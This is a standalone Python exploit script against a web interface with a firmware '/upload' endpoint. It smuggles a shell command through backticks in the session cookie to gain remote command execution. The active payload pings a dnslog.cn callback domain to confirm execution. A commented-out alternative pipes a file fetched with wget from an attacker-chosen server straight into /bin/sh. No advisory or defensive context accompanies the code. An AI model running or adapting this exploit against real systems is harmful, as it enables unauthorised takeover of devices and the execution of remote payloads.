import argparse
# from urlparse import urlparse
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings()


def main(url, cmd):
    ip = urlparse(url).hostname
    port = urlparse(url).port
    scheme = urlparse(url).scheme
    if not port:
        if scheme == "http":
            port = 80
        else:
            port =443
    rce_url = url + "/upload"
    headers = {"Host": ip + str(port),
                "Cookie": "sessionid=" + "'`%s`';" % cmd,
                "Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="90"',
                "Accept": "application/json, text/plain, */*",
                "Optional-Header": "header-value",
                "Sec-Ch-Ua-Mobile": "?0",
                "Authorization": "111",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjUEtAPGhdOk1qbQv",
                "Origin": url,
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": url + "/index.html",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Connection": "close"}
    data = """
    ------WebKitFormBoundaryjUEtAPGhdOk1qbQv
Content-Disposition: form-data; name="pathparam"

Firmware
------WebKitFormBoundaryjUEtAPGhdOk1qbQv
Content-Disposition: form-data; name="fileparam"

file001
------WebKitFormBoundaryjUEtAPGhdOk1qbQv
Content-Disposition: form-data; name="destination"

111111
------WebKitFormBoundaryjUEtAPGhdOk1qbQv
Content-Disposition: form-data; name="option"

111111
------WebKitFormBoundaryjUEtAPGhdOk1qbQv
Content-Disposition: form-data; name="file"; filename="1.img"
Content-Type: application/octet-stream

111
------WebKitFormBoundaryjUEtAPGhdOk1qbQv--
    """
    try:
        rep = requests.post(url=rce_url,headers=headers,data=data,verify=False,timeout=15)
    except:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target Host')
    parser.add_argument('-i', '--id', help='id')
    parser.add_argument('-s', '--server', default='127.0.0.1', help='dlserver')
    args = parser.parse_args()
    command = "ping -c 5 xglp3a.dnslog.cn"
    # command = "wget -q -O - http://%s/x | /bin/sh" % args.server
    main(args.target, command)